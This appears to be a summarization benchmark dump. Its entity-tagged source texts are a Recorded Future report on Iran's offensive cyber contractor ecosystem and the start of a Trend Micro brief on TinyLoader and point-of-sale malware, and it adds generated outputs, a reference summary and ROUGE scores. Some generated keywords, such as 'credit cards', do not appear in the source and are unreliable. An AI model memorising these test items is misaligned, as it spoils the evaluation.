activity we analyzed was in preparation of the [GPE] U.S. announcement . According to [ORG] Insikt [ORG] Group \u2019s source , to find and retain the best offensive cyber talent , [NORP] Iranian government contractors are forced to mine closed - trust communities . The links between the forums and contractors may illustrate that the trust communities begin with the [NORP] Iranian security forums . The History of Iranian Geopolitical Response and [LAW] the [LAW] Nuclear [LAW] Agreement [LAW] Decision Editor \u2019s [LAW] Note : Where applicable , information in this section was provided by a former [NORP] Iranian hacker with direct access to the information provided . Based on additional corroboration , we assess high confidence in this information . We refer to this individual as \u201c [ORG] Insikt [ORG] Group \u2019s source \u201d in other sections where their information is cited . Since [DATE] 1979 , [GPE] Iran \u2019s reactions to perceived [NORP] Middle [NORP] Eastern adversaries \u2019 foreign policy has been a study in the use of proxies . Specifically , [GPE] Israel , [GPE] Saudi [GPE] Arabia , [GPE] United [GPE] States , and [GPE] Iraq have been frequent targets of Iranian- funded military actions , most recently through [ORG] Houthi rebels in [GPE] Yemen , and [ORG] Hezbollah everywhere else . Since [DATE] 2009 , [GPE] Iran has developed proxies in the cyber domain to partially obfuscate government fingerprints from foreign attacks . Subsequent to starting a cyber operations program in [DATE] 2009 , the [NORP] Iranian government had an immediate need to use the program in [DATE] the [DATE] fall [DATE] of [DATE] 2012 after [GPE] U.S. President [PERSON] Obama imposed severe financial sanctions on [GPE] Iran , including removing [GPE] Iran from the SWIFT money transfer system . Recorded Future | www.recordedfuture.com | CTA-2018 - 0509According to [ORG] Insikt [ORG] Group \u2019s source , the [NORP] Iranian government authorized denial - of - service attacks on [GPE] America \u2019s largest financial services companies as an immediate response to the sanctions in a campaign dubbed [ORG] Operation [ORG] Ababil . A quick response was top priority , so time and planning were forgone luxuries for the [NORP] Iranian government . Instead , the [NORP] Iranian government opted for speed and the most capable actors , regardless of demonstrated ideology . Similarly , [DATE] a [DATE] year [DATE] later in [DATE] the [DATE] fall [DATE] of [DATE] 2013 , [PERSON] Sheldon [PERSON] Adelson ( the CEO of [ORG] Sands [ORG] Corporation ) publicly suggested that [GPE] the [GPE] United [GPE] States should attack [GPE] Iran with an atomic weapon . In [DATE] February [DATE] 2014 , [GPE] Iran launched a destructive attack on [FAC] the [FAC] Sands [FAC] Las [FAC] Vegas [FAC] Corporation that caused significant network damage . This was the [ORDINAL] second public [NORP] Iranian attack campaign on an [NORP] American business , where the response called for speed over time and preparation . The [NORP] Iranian attacks in [DATE] 2012 and [DATE] 2014 were in contrast to the relatively slow and methodical work of [ORG] APT [ORG] 33 , APT [CARDINAL] 34 , and [ORG] APT [DATE] 35 , developing custom malware , targeting data exfiltration from strategic intelligence targets such as [GPE] U.S. military contractors , [LOC] Middle [LOC] East energy companies , and university research networks . Comparing [NORP] Iranian campaigns \u2014 methodical versus reactionary . [ORG] Recorded [ORG] Future | www.recordedfuture.com | CTA-2018 - 0509Building a [ORG] National [ORG] Capability [ORG] \u2014 [ORG] History and Relationships Between [ORG] ProxiesThe [ORG] Iranian [ORG] Revolution replaced the [NORP] Persian monarchy and transitioned the Shah \u2019s power to [GPE] the [GPE] Islamic [GPE] Republic , led by [PERSON] Ayatollah [PERSON] Ruhollah [PERSON] Khomeini . Loyalty to the resulting theocracy was defined by alignment to [ORG] the [ORG] Supreme Leader \u2019s moral precepts . The new leaders of [GPE] Iran also established an intelligence and security organization , [ORG] the [ORG] Islamic [ORG] Revolutionary [ORG] Guard [ORG] Corps ( [ORG] IRGC ) , \u201c charged with defending [GPE] the [GPE] Islamic [GPE] Republic against internal and external threats . \u201d Currently , the [ORG] IRGC is [GPE] Iran \u2019s premier security organization and possesses an army , navy , and air force , and manages \u201c [GPE] Iran \u2019s ballistic missile arsenal and irregular warfare operations through its elite Quds Force and proxies such as [ORG] Hezbollah . \u201dThe [ORG] IRGC has a vast domestic information security and monitoring mandate , as well as broad foreign mission , and has been linked to cyberattacks against Western institutions since at least 2011.According to [ORG] Insikt [ORG] Group \u2019s source , during the [DATE] 2009 [EVENT] Green [EVENT] Revolution , [ORG] Gerdab.ir emerged as the [ORG] IRGC \u2019s domestic hacking group tasked with targeting opposition news websites and individuals considered immoral by the regime . [NORP] Iranian hackers targeting [NORP] Iranian government resources ( [CARDINAL] one example was defacing [ORG] Khamanei.ir ) were identified by [GPE] Gerdab and imprisoned . [GPE] Gerdab continues to act as the [NORP] Iranian government \u2019s internal censor . Following [EVENT] the [EVENT] Green [EVENT] Revolution , the [NORP] Iranian government considered adding a formal offensive cyber component to its existing intelligence apparatus , and was forced to address a personnel problem . [GPE] Iran needed a talented , but politically and religiously reliable workforce . Stuxnet and scientist assassinations reminded [GPE] Iran of the efficacy of [ORG] Mossad and [ORG] CIA programs , and according to [ORG] Insikt [ORG] Group \u2019s source , fervent religious ideology was the only way to demonstrate loyalty and build trust . The emergence of [ORG] the [ORG] Iranian [ORG] Cyber [ORG] Army ( [ORG] ICA ) as an extension of the [ORG] IRGC was an initial attempt by [GPE] the [GPE] Islamic [GPE] Republic at conducting internationally focused operations . These operations were a departure from [GPE] Gerdab \u2019s focus on maintaining domestic moral values and defending government rhetoric . In [DATE] 2011 , the [ORG] IRGC \u2019s [ORG] ICA formed the foundation of [FAC] the [FAC] Khaybar [FAC] Center [FAC] for [FAC] Information [FAC] Technology . According to a former [ORG] IRGC cyber commander , [ORG] the [ORG] Khaybar [ORG] Center was established in [DATE] 2011 and has been linked to a number of attacks against [GPE] the [GPE] United [GPE] States , [GPE] Saudi [GPE] Arabia , and [GPE] Turkey . Even [DATE] today , the balance between ideology and cyber skills remains problematic . [CARDINAL] One example of the conflict between ideology and skill was [PERSON] Mohammad [PERSON] Hussein [PERSON] Tajik , a former cyber commander within the [ORG] IRGC . According to [ORG] Insikt [ORG] Group \u2019s source , [PERSON] Tajik \u2019s father maintained a strong religious background and was a veteran of [GPE] Iran \u2019s ministry of intelligence . Yet [PERSON] Tajik was arrested and killed because the [NORP] Iranian government feared that [PERSON] Tajik was not ideologically aligned and posed a betrayal and flight risk . [ORG] Recorded [ORG] Future | www.recordedfuture.com | CTA-2018 - 0509Following [EVENT] the [EVENT] Green [EVENT] Revolution , [GPE] Iran \u2019s government needed to quickly improve its cyber capabilities , but according to [ORG] Insikt [ORG] Group \u2019s source , the talent was primarily young and focused on financial benefits . This motivation bred government mistrust , as [GPE] the [GPE] Islamic [GPE] Republic feared that the financially motivated could be bought by foreign intelligence services . Additionally , many of the original [NORP] Iranian hackers responsible for mass defacements hated authority and lacked the discipline necessary for government work . According to [ORG] Insikt [ORG] Group \u2019s source , the government answer was a tiered approach , with a network of people unofficially associated with the [ORG] IRGC and [NORP] Iranian government \u2014 a type of ideologically aligned middle management \u2014 that were loyal to the regime and demonstrated sufficient religious commitment . This middle tier translated intelligence priorities into segmented cyber tasks which were then bid out to multiple contractors . Sometimes the contractors would compete with each other , sometimes they would work together , but payment was only made once the objective was completed . The result was ( and presently remains ) a quasi - capitalistic system that pitted contractors against each other for influence with the [NORP] Iranian government . In [GPE] the [GPE] Islamic [GPE] Republic , influence can lead to security and wealth , but it can also lead to a false sense of security ( no one is above being imprisoned and questioned at any given time ) . Thus , contractors must learn to play the game \u2014 enough surface - level adherence to the regime \u2019s ideology \u2014 to gain temporary reprieves from suspicion long enough to be given contracted work . To the [NORP] Iranian government , ideology is more important than skills . Deep belief in the Ayatollah \u2019s precepts and the government \u2019s goals helps to avoid defections and traitors . Obfuscating [NORP] Iranian government involvement in offensive campaigns . [ORG] Recorded [ORG] Future | www.recordedfuture.com | CTA-2018 - 0509Today , based on ongoing contact between [ORG] Insikt [ORG] Group \u2019s source and [NORP] Iranian hackers , it is estimated that there are over [CARDINAL] 50 organizations vying for government - sponsored offensive cyber projects . Only the best teams succeed , are paid , and remain in business . The government does its best to compartmentalize \u2014 [CARDINAL] one job might be creating a remote code exploit ( RCE ) for a popular software application , while another job might be using the RCE and establishing persistent unauthorized access . [CARDINAL] Two different contractors ( or more ) are typically required to complete the government - defined objective . Public knowledge has also established that [NORP] Iranian academic institutions play a contractor - like role . Specific examples include [ORG] Shahid [ORG] Beheshti [ORG] University ( SBU ) and [ORG] the [ORG] Imam [ORG] Hossein [ORG] University ( IHU ) , which have comprehensive science and technology departments attracting some of the best academic talent in [GPE] Iran . In fact , the [ORG] SBU has a specific cyberspace research institute dedicated to such matters . In fact , the [ORG] SBU has a specific cyberspace research institute dedicated to such matters , and the [ORG] IHU was founded by the IRGC.As the [ORG] Mabna [ORG] Institute indictments highlight , despite the lifting of sanctions and an appetite to re - engage with the international community , [GPE] Iran has continued a subversive and aggressive global cyber operations campaign . This ongoing campaign , which targets universities for scientific and technological intellectual property theft , demonstrates a fundamental lack of trust in the international agreements , including the Joint Comprehensive Plan of Action ( JCPOA).Relationship Between [ORG] the [ORG] Iranian [ORG] Government , [ORG] Contractors , and [ORG] Security [ORG] ForumsClearsky , [ORG] FireEye , [ORG] Symantec , and [NORP] PhishLabs have all performed significant research on [NORP] Iranian nation - state - sponsored campaigns that provide historical insight into technical capabilities and relationships between the [NORP] Iranian government and contractors . The work of the aforementioned security companies and recent [ORG] U.S. [ORG] Department [ORG] of [ORG] Justice indictments provides consistent evidence that [NORP] Iranian government - sponsored offensive campaigns are executed by contractors . [ORG] FireEye disclosed that [ORG] the [ORG] Nasr [ORG] Institute was an [ORG] APT [ORG] 33 contractor in an operation that used publicly available backdoors and remote access trojans . The handle \u201c xman_1365_x \u201d ( self - identified on security forums as [ORG] Mahdi [ORG] Honarvar ) was found by [ORG] FireEye in malware artifacts , which open sources linked to [ORG] the [ORG] Nasr [ORG] Institute . Previously , [ORG] Nasr [ORG] Institute had been associated with [ORG] Operation [ORG] Ababil \u2019s distributed denial - of - service attacks against [NORP] American banks , an organization which [ORG] a [ORG] U.S. [ORG] Department [ORG] of [ORG] Justice indictment confirms had been hired to build attack infrastructure by the [NORP] Iranian government . The actor [PERSON] xman_1365_x was then linked to a security company called [ORG] Kavosh [ORG] Security via OSINT by [ORG] Iran [ORG] Cyber [ORG] News [ORG] Agency . The actor was linked to a destructive operation , which used [PRODUCT] NewsBeef and [PRODUCT] StoneDrill malware families . According to [PERSON] Kaspersky , the latter data wiping operation targeted sectors across [GPE] Saudi [GPE] Arabia and [LOC] Europe . [ORG] Recorded [ORG] Future | www.recordedfuture.com | CTA-2018 - 0509Command and control ( C2 ) domains used by [ORG] StoneDrill and [ORG] NewsBeef in [ORG] Kaspersky \u2019s findings were found to share an SSL certificate , which surfaced [CARDINAL] an [CARDINAL] additional [CARDINAL] three domains in research by [ORG] the [ORG] Iran [ORG] Cyber [ORG] News [ORG] Agency . WHOIS information was then connected via open sources to [ORG] Imam [ORG] Hossein [ORG] University ( IHU ) . IHU was named in sanctions by [ORG] the [ORG] U.S. [ORG] Treasury \u201c for providing , or attempting to provide technological , or other support for and services in support of the IRGC.\u201dAdditional publicly known [NORP] Iranian contractors include [ORG] ITSecTeam ( ITSEC ) and [ORG] Mersad [ORG] Company , also linked to [ORG] Operation [ORG] Ababil . The links between the [NORP] Iranian government and contractors are well documented ; however , the identity of specific groups and individuals within the [NORP] Iranian government and [ORG] IRGC responsible for offensive cyber campaigns is murky , as is the relationship between contractors and security forums . Yet , our research and analysis suggest that [NORP] Iranian security forums may play a role in staffing and knowledge sharing for [NORP] Iranian contractors . [ORDINAL] First , [ORG] FireEye referenced the publicly available [ORG] ALFA [ORG] TEaM [ORG] Shell in APT33 spear phishing email campaigns . [ORG] The [ORG] ALFA [ORG] Shell is discussed in multiple web locations , including [GPE] Ashiyane and [ORG] Iranian [ORG] Dark [ORG] Coders [ORG] Team [ORG] Forum . [ORG] ALFA [ORG] TEaM shell history . Recorded Future | www.recordedfuture.com | CTA-2018 - 0509Second , [PERSON] xman_1365_x created an [GPE] Ashiyane profile on [DATE] August 8 , [DATE] 2010 , allegedly not long after [PERSON] Ashiyane temporarily became the primary security forum in [GPE] Iran , following [ORG] Behrooz Kamalian \u2019s visit to prominent cleric , [PERSON] Ayatollah [PERSON] Naser Makarem Shirazi.xman_1365_x created an [GPE] Ashiyane profile in 2010.Finally , according to [ORG] Insikt [ORG] Group \u2019s source , [NORP] Iranian contractor ITSEC specifically employed hackers from the respective online forums [PERSON] Simorgh and [ORG] Delta [ORG] Security . Further , [PERSON] Hossein [PERSON] Asgari , a self - proclaimed [NORP] Iranian hacker , managed the [PERSON] Simorgh forum and worked with his father , who was employed by the IRGC.Source : url Future | www.recordedfuture.com | CTA-2018 - 0509Zone - h captured website defacements committed by [PRODUCT] Hossein [PRODUCT] AsgariSource : url to [ORG] Insikt [ORG] Group \u2019s source , to find and retain the best offensive cyber talent , [NORP] Iranian government contractors are forced to mine closed - trust communities . The links between the forums and contractors may illustrate that the trust communities begin with the [NORP] Iranian security forums . [ORG] Analyzing [ORG] Iranian [ORG] Cyber [ORG] Institute Internet [ORG] TrafficInsikt [ORG] Group analyzed internet traffic relating to various institutes affiliated with the [NORP] Iranian cyber ecosystem from [DATE] March 1 , [DATE] 2018 to [DATE] April [DATE] 30 , [DATE] 2018 . Our goal was to determine whether any of these institutes had forecasted [GPE] Iran \u2019s intentions in cyberspace leading up to the [GPE] U.S. decision to withdraw from the [DATE] 2015 JCPOA.This is [ORG] Insikt [ORG] Group \u2019s [ORDINAL] first profiling of internet activity for [NORP] Iranian cyber institutes . While we can not assess whether this level of activity is typical or not , monitoring it over time to determine changes in response to international pressure could be revealing . [ORG] Cyberspace [ORG] Research [ORG] Institute of IranIran \u2019s [ORG] Cyberspace [ORG] Research [ORG] Institute ( CSRI ) is a research center affiliated with the prestigious [ORG] Shahid [ORG] Beheshti [ORG] University in [GPE] Iran . The institute commands a significant proportion of the university \u2019s allocated [ORG] IP space , with [CARDINAL] no [CARDINAL] fewer [CARDINAL] than [CARDINAL] eight /24 [ORG] IP ranges registered to the CSRI in [GPE] Iran , ranges . We discovered over [CARDINAL] 400 previously unreported [ORG] SSH sessions between [ORG] CSRI ranges and [NORP] Spanish government and university networks from [DATE] April 4 , [DATE] 2018 to [DATE] April 9 , [DATE] 2018 . These exchanges involved the transfer of a large volume of data between the [CARDINAL] two networks . The [NORP] Spanish networks resolved to departments supporting the digital transformation of [NORP] Spanish public services and multi - disciplined universities . Direct network connectivity between the [NORP] Iranian and [NORP] Spanish institutions demonstrates that they either have a deep academic relationship and are sharing data with one another , or the large transfer of data from the [NORP] Spanish institutes is unwarranted . It is unlikely that CSRI would have a valid business interest with [NORP] Spanish government departments , so the large volume of data transferred between the [CARDINAL] two networks over such a short period of time is a conspicuous indicator of possibly malicious activity . Throughout [DATE] April , [GPE] Iran \u2019s CSRI simultaneously demonstrated an increased interest in [ORG] the [ORG] Philippine [ORG] Department [ORG] of [ORG] Science [ORG] & [ORG] Technology ( [ORG] DOST ) . Similar to the [NORP] Spanish network interactions , very large data volumes were exchanged between the [CARDINAL] two networks , denoting strong interest . This level of engagement and interaction , particularly in light of the reduction of sanctions , and the thawing of relations between [GPE] Iran and the [LOC] West following the [DATE] 2015 JCPOA , was expected between academia . In fact , in [DATE] 2015 and [DATE] 2017 , [NORP] Philippine and [NORP] Spanish universities agreed to expand scientific cooperation with [NORP] Iranian institutions . However , given [ORG] CSRI \u2019s background , [GPE] Iran \u2019s demonstrated interest in using cyber operations to steal academic and intellectual property , and our evidence of ongoing campaigns targeting universities for theft worldwide , we assess that this activity between [ORG] CSRI and these [NORP] Spanish and [NORP] Philippine universities may be malicious . [ORG] Recorded [ORG] Future | www.recordedfuture.com | CTA-2018 - 0509CSRI was also observed in a large number of events dispatching the Parsijoo bot to crawl websites of interest . According to [ORG] Wikipedia , [ORG] Parsijoo.ir is the [ORDINAL] second most popular search engine in [GPE] Iran after Google and it uses the [LOC] Parsijoobot to crawl websites for indexing purposes . During our research , we noted repeated crawls of a specialist Canadian - [NORP] Iranian immigration website , www.itc - canada[.]com , using Parsijoo bot from [ORG] CSRI [ORG] IP ranges . The crawls were observed throughout our data period from [DATE] early [DATE] March continuing right through to [DATE] the [DATE] end [DATE] of [DATE] April , suggesting a strong , persistent interest in this particular site . Finally , we identified CSRI interacting with IPs registered to [ORG] Ravand [ORG] Cybertech [ORG] Inc. [PERSON] Ravand [PERSON] Cybertech offers , via its website ravand[.]com , cloud hosting solutions , among other services . [PERSON] Ravand [PERSON] Cybertech has strong ties to the [NORP] Iranian regime . Historically , it hosted the website of the conservative news agency [PERSON] Fars which is affiliated with the [NORP] Iranian military . The company \u2019s registered [ORG] IP ranges sit under AS12212 with the following [ORG] Ministry [ORG] of [ORG] Intelligence [ORG] Services ( MOIS ) agent , [GPE] Massoud [GPE] Khodabandeh , in a disinformation campaign conducted in [NORP] Western media . The campaign attempted to discredit and demonize the main [NORP] Iranian opposition party , [ORG] the People \u2019s [ORG] Mojahedin [ORG] Organization of Iran / Mojahedin - e [PERSON] Khalq ( PMOI / MEK ) . According to an opinion piece written for The Hill , the websites were found by the [ORG] Pentagon to be created by order from [GPE] Tehran . [PERSON] Ravand [PERSON] Cybertech was identified as being an \u201c [NORP] Iranian state - run \u201d company , which hosted fake news sites aimed at disseminating [NORP] Iranian propaganda to undermine the efforts of [NORP] Iranian - American lobbyists . Based on the volume of activity observed during our research , we assess the [ORG] CSRI may be engaged in supporting the malicious disinformation activities of [PERSON] Ravand [PERSON] Cybertech . [ORG] Imam [ORG] Hossein [ORG] University ( Imam Hussein University)The Imam [ORG] Hossein [ORG] Comprehensive [ORG] University ( IHU ) is an [NORP] Iranian university based in [GPE] Tehran that is affiliated with [ORG] the [ORG] Iranian [ORG] Revolutionary [ORG] Guard [ORG] Corps ( [ORG] IRGC ) , [ORG] the [ORG] Iranian [ORG] Ministry [ORG] of [ORG] Science , [ORG] Research [ORG] and [ORG] Technology , and [ORG] the [ORG] Iranian [ORG] Ministry [ORG] of [ORG] Defense [ORG] and [ORG] Armed [ORG] Forces [ORG] Logistics . Recorded Future | www.recordedfuture.com | CTA-2018 - 0509Our research focused on the publicly noted [ORG] IP ranges for the university , higher educational establishments and specific government departments . In fact , [CARDINAL] two of the same [NORP] Spanish establishments exchanged high data volumes with the [ORG] IHU source range [ORG] IPs . Further web browsing activity from [ORG] IHU ranges was noted to the website of a U.S.-based multinational engineering software company , [ORG] Gamma [ORG] Technologies . The browsing activity was centered on its GT - SUITE software . [ORG] Gamma [ORG] Technologies specializes in the development of simulation software for a wide variety of worldwide industries , including power generation . Mabna [NORP] InstituteAs previously detailed , [ORG] the [ORG] Mabna [ORG] Institute was publicly identified in an [ORG] FBI indictment as a front company engaged in hostile state - sponsored cyberespionage on behalf of the [NORP] Iranian state . Our OSINT research identified a single domain , mabna - ins[.]ir , which could correspond to the group . The domain was previously hosted on an [NORP] Iranian IP 5.144.130[.]23 and since [DATE] April 22 , [DATE] 2017 , points at [NORP] German VPS IP [CARDINAL] 144.76.87[.]86 . This [ORG] VPS also hosts [CARDINAL] over [CARDINAL] 2,000 other domains , most of which are .ir domains . Recorded Future | www.recordedfuture.com | CTA-2018 - 0509Source : mabna - ins[.]irIntent , Scenarios for Retaliation , and [ORG] RecommendationsAccording to the terms of the [ORG] JCPOA , [GPE] Tehran agreed to restrictions on its nuclear weapons program in exchange for sanctions relief . However , various provisions of the accord expire at different times over [DATE] the [DATE] next [DATE] 25 [DATE] years , with some expiring as soon as 2025.On [DATE] May 8 , [DATE] 2018 , President [PERSON] Trump decided not to renew the waivers suspending some [GPE] U.S. sanctions against [GPE] Iran and initiated a de facto [GPE] U.S. withdrawal from the agreement . As a result of this action , we assess that [GPE] Iran will likely respond quickly by launching destructive attacks on [NORP] American , [NORP] European , and rival nation ( countries such as [GPE] Saudi [GPE] Arabia and [GPE] Israel ) businesses . Conversely , [GPE] Iran may also retaliate ( exclusively or in conjunction with destructive attacks ) through cyber proxies in more methodical and sustained campaigns . Given the impact of re - applied and expanded economic sanctions , it is likely that [NORP] American , [NORP] European , and rival nation businesses will also be targeted with more sustained destructive attacks . Recorded Future | www.recordedfuture.com | CTA-2018 - 0509As documented above , when pursuing quick - turn cyber operations , the [NORP] Iranian regime will weigh religious and political reliability against offensive skills . The best operators are not always the most devout or loyal to the regime and we assess that , in this case , the [ORG] IRGC may forgo careful contractor selection and planning in an attempt to deliver a destructive attack within a short period of time . Further , our research indicates that because of the need for a quick response , [GPE] the [GPE] Islamic [GPE] Republic may utilize contractors that are less politically and ideologically reliable ( and trusted ) and as a result , could be more difficult to control . It is possible that this dynamic could limit the ability of the government to control the scope and scale of these destructive attacks once they are unleashed . Western businesses should closely monitor geopolitical events initiated by [GPE] the [GPE] United [GPE] States or [LOC] Europe that affect [GPE] Iran . As demonstrated above , Western businesses are the logical victims of [NORP] Iranian retaliation for perceived [NORP] American policy transgressions ; specifically businesses in financial services , government departments , critical infrastructure providers , and oil and energy sectors . In addition to carefully monitoring [NORP] Iranian geopolitical developments , tracking emerging tactics , techniques , and procedures ( TTPs ) on [GPE] Ashiyane , specifically , is wise for any Western commercial threat intelligence program to determine the efficacy of existing security controls . [ORG] Recorded [ORG] Future | www.recordedfuture.com | CTA-2018 - 0509About Recorded Future Recorded Future arms security teams with the only complete threat intelligence solution powered by patented machine learning to lower risk . Our technology automatically collects and analyzes information from an unrivaled breadth of sources and provides invaluable context in real time and packaged for human analysis or integration with security technologies . \u00a9 [ORG] Recorded [ORG] Future , [ORG] Inc. All rights reserved . All trademarks remain property of their respective owners.www.recordedfuture.com@RecordedFuture", "generated_text": "The report; Iranian cyber operations; 2018; the economic impact; sanctions; the U.S.; a de facto U.S. withdrawal; the 2015 Joint Comprehensive Plan of Action; JCPOA; the JCPOA; a backdoor; credential theft; a system; contractors; influence; governments; the group; the Iranian government; an ideologically and politically trusted group; middle managers; intelligence priorities; segmented cyber tasks; multiple contractors; influence; the Iranian government; the infrastructure; industries; energy; banks; financial services; government departments; critical infrastructure providers; oil and energy; 2017; the use; actors; Iranian cyber attacks; credit cards; the U.S.; the Iranian government; strong cyber credentials; 15 years; the organizations; sanctions; practices; reasons; the report.", "ref_text": "<START-1>The report profiles Iran's offensive cyber capabilities and contractor ecosystem. It assesses that Iran will likely retaliate with cyberattacks on Western businesses in response to the U.S. withdrawal from the Iran nuclear deal. Iran has historically used proxies and contractors to conduct cyber operations that align with regime interests but offer some deniability. A tiered approach is used - trusted middlemen translate intelligence priorities into cyber tasks that are bid out to contractors. An ideologically aligned workforce is prioritized over pure technical capability. There are an estimated 50+ contractors competing for Iranian cyber projects. The IRGC and academic institutes also participate. Analysts looked at internet traffic of Iranian cyber institutes from March-April 2018. Suspicious activity was seen between Shahid Beheshti University ranges and Spanish/Philippine networks, and with a propaganda-linked cloud provider. When rapid cyber retaliation is required, Iran may use less trusted contractors, potentially limiting their control over the scope of attacks. Infrastructure and energy companies should monitor for fallout from Iranian geopolitical developments. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4264705882352941, "gpt3/lexical/rouge_rouge2": 0.16256157635467983, "gpt3/lexical/rouge_rougeL": 0.24019607843137256, "gpt3/lexical/rouge_rougeLsum": 0.24019607843137256, "gpt3_generated_text": ["This article discusses the Iranian cyber operations and the potential economic impact of sanctions imposed by the United States. The Islamic Republic of Iran has a history of conducting offensive cyber campaigns in response to sanctions or perceived provocations. The country has previously used proxies or front organizations in both physical conflict and cyberattacks to achieve its policy goals. With the US withdrawal from the 2015 Joint Comprehensive Plan of Action (JCPOA), Iran is likely to respond by launching cyberattacks on Western businesses, particularly in sectors that were previously targeted between 2012 and 2014, such as banks, financial services, government departments, critical infrastructure providers, and oil and energy. The article also highlights that Iranian cyber operations are administered through a tiered approach, where middle managers translate intelligence priorities into segmented cyber tasks that are bid out to multiple contractors. This creates a quasi-capitalistic system where contractors compete for influence with the Iranian government. The Iranian government operates with embedded paranoia, making it difficult to trust anyone, which creates unique trade-offs in the government-sanctioned offensive cyber campaigns. The article also mentions that there are over 50 estimated contractors vying for Iranian government-sponsored offensive cyber projects, and only the best individuals or teams succeed and remain in business. The article concludes by stating that the analysis of internet traffic related to Iranian cyber institutes cannot determine if the suspicious activity analyzed was in preparation for the US announcement."]}, {"split_name": "val", "sample_id": "val_134", "prompt_text": "Extract the keywords: A [NORP] TrendLabs [PRODUCT] ReportBackdoor as a Software Suite : How TinyLoader Distributes and Upgrades PoS ThreatsTrendLabs Security Intelligence Blog Jay Yaneza and [ORG] Erika [ORG] Mendoza [ORG] Trend [ORG] Micro [ORG] Cyber [ORG] Safety [ORG] Solutions [ORG] Team May 2016Trend Micro | Backdoor as a Software Suite : How TinyLoader Distributes and Upgrades PoS ThreatsContents Introduction 1 TinyLoader \u2014 the not - so - missing link ? 1 Method of operations : testing [ORDINAL] first before mass deployment 2 Ties that bind : the TinyPOS - AbaddonPOS connection 6 Widespread distribution [CARDINAL] 10 [WORK_OF_ART] Challenges [WORK_OF_ART] and [WORK_OF_ART] Recommendations 11 Appendix 13TREND MICRO LEGAL DISCLAIMERThe information provided herein is for general information and educational purposes only . It is not intended and should not be construed to constitute legal advice . The information contained herein may not be applicable to all situations and may not reflect the most current situation . Nothing contained herein should be relied on or acted upon without the benefit of legal advice based on the particular facts and circumstances presented and nothing herein should be construed otherwise . [ORG] Trend [ORG] Micro reserves the right to modify the contents of this document at any time without prior notice . Translations of any material into other languages are intended solely as a convenience . Translation accuracy is not guaranteed nor implied . If any questions arise related to the accuracy of a translation , please refer to the original language official version of the document . Any discrepancies or differences created in the translation are not binding and have no legal effect for compliance or enforcement purposes . Although [ORG] Trend [ORG] Micro uses reasonable efforts to include accurate and up - to - date information herein , [ORG] Trend [ORG] Micro makes no warranties or representations of any kind as to its accuracy , currency , or completeness . You agree that access to and use of and reliance on this document and the content thereof is at your own risk . [ORG] Trend [ORG] Micro disclaims all warranties of any kind , express or implied . Neither [ORG] Trend [ORG] Micro nor any party involved in creating , producing , or delivering this document shall be liable for any consequence , loss , or damage , including direct , indirect , special , consequential , loss of business profits , or special damages , whatsoever arising out of access to , use of , or inability to use , or in connection with the use of this document , or any errors or omissions in the content thereof . Use of this information constitutes acceptance for use in an \u201c as is \u201d condition . [ORG] Trend [ORG] Micro [ORG] | [ORG] Backdoor as a Software Suite : How TinyLoader Distributes and Upgrades PoS ThreatsIntroduction The tandem of TinyLoader backdoor and a point - of - sale ( PoS ) threat , AbaddonPOS was [ORDINAL] first reportedly seen in [DATE] November [DATE] 2015 . When we noticed a sudden spike in AbaddonPOS detections just this [DATE] January , TinyPOS , another PoS malware strain , has also reared its ugly head that time . This prompted us to probe further on these threats and check if they are in any way related to one another . Our analysis reveals that [ORG] TinyLoader , a backdoor used for secondary malware infection , is distributing and managing the upgrades of AbaddonPOS . Likewise , [ORG] TinyLoader is also spreading TinyPOS variants . This leads us to conclude that the operators behind TinyPOS and AbaddonPOS are one and the same . In this technical brief , we \u2019ll discuss the ties that bind TinyLoader with [CARDINAL] two notorious PoS threats \u2014 AbaddonPOS and TinyPOS , including how the perpetrators behind this operation deployed their arsenals . TinyLoader \u2014 The Not - So - Missing Link ? It \u2019s always good to examine the entry points of PoS malware in their target environment to understand these threats better . Initial information on AbaddonPOS details its links to TinyLoader backdoor , which [ORG] Trend [ORG] Micro detects as BKDR_TINY , BKDR64_TINY or TROJ_TINY.TinyLoader can run any shellcode on the system and its primary function is to introduce secondary infections on the environment . That being said , seeing TinyLoader in an environment is not the leading or sole indicator of PoS threats as it can be directed to do other malicious activities . For the purpose of this write - up , we checked any indicator connecting AbaddonPOS and TinyPOS.Based on our [ORG] Smart [ORG] Protection [ORG] Network data , there are more TinyLoader - related infections in Asia - Pacific and [LOC] North [LOC] America from the period of [DATE] January - [DATE] April [DATE] 2016 . Our data also indicate that 64 % of our detections on [ORG] TinyLoader infections are mostly Windows 7 ( 64 Bit ) platforms.1Trend [ORG] Micro [ORG] | [ORG] Backdoor as a Software Suite : How TinyLoader Distributes and Upgrades PoS ThreatsFigure 1 . Global distribution of TinyLoader - related infections ( [DATE] January - [DATE] April 2016)Method of Operations : Testing First Before Mass Deployment As seen in the geographical map above , there \u2019s a widespread presence of TinyLoader - related infections across the globe . With this established footprint , TinyLoader can selectively introduce secondary infections based on what \u2019s interesting in the environment it is running on . This business model is true to any malware as a service . TinyLoader used [CARDINAL] two very small components : a module that can take a screenshot ( grabber ) , and a module that functions as a process enumerator . Both modules are very small in size and simply loaded into memory . But these modules do not necessarily have any malicious payload . They are just used to gather information or reconnaissance on infected systems . During our research , we identified that screenshot grabber were deployed several times a day for over an extended period for collecting data on the system.2Trend [ORG] Micro [ORG] | [ORG] Backdoor as a Software Suite : How TinyLoader Distributes and Upgrades PoS ThreatsFigure 2 . TinyLoader uses [CARDINAL] two small components for reconnaissanceAfter TinyLoader identifies an infected system , the operator then may choose to deploy a [ORDINAL] secondary payload . In this particular case , it was AbaddonPOS [ORDINAL] first , followed by TinyPOS . We have identified [CARDINAL] two periods where AbaddonPOS variants were massively distributed:3Trend [ORG] Micro [ORG] | [ORG] Backdoor as a Software Suite : How TinyLoader Distributes and Upgrades PoS ThreatsFigure [CARDINAL] 3 . [LOC] North [LOC] America is heavily affected by the [ORDINAL] first wave of AbaddonPOS attacks , aroundJanuary 29 - 30 , [CARDINAL] 20164Trend Micro | Backdoor as a Software Suite : How TinyLoader Distributes and Upgrades PoS ThreatsFigure [CARDINAL] 3 . The [ORDINAL] second wave of AbaddonPOS attacks mostly hit countries in [LOC] Europe , aroundMarch [CARDINAL] 31 \u2013 [DATE] April [DATE] 1 , [CARDINAL] 2016Since most of the infected environment run on Windows [CARDINAL] 7 operating system ( OS ) , AbaddonPOS is stored in % PROGRAMDATA% . In its initial wave , it used the file name , scheduler.exe and the mutex , [ORG] MR_D , resembling some of the documented behaviors of this PoS malware in [DATE] 2015 . After this initial mass - deployment , there were small incremental file variations being introduced throughout [DATE] February [DATE] 2016.Around [DATE] March 